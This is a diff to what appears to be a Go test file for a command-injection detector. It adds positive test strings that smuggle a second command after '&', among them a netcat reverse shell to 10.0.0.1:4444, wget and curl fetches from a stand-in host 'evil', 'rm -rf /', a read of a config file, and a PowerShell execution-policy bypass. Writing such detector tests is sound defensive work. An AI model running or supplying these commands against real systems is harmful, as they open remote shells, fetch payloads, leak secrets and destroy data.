@@ -102,6 +102,17 @@ var (
 		"powershell -ec SQBFAFgA",
 		"powershell -EncodedCommand SQBFAFgA",
 		"powershell -ExecutionPolicy Bypass -File x.ps1",
+		// Fix round 1: real flags after a prose "&" restore the full rules.
+		"x & ping -c 21 127.0.0.1 &",
+		"127.0.0.1 & ping -n 21 127.0.0.1 &",
+		"x & nc 10.0.0.1 4444 -e /bin/sh",
+		"x & nc 10.0.0.1 4444",
+		"x & wget -O- http://evil/x",
+		"x & curl -s http://evil/x",
+		"x & ls -la /tmp",
+		"x & rm -rf /",
+		"x & cat /app/config.yaml",
+		"powershell -ep bypass -File x.ps1",
 	}
 	cmdINegatives = []string{
 		"see you; id card copy",
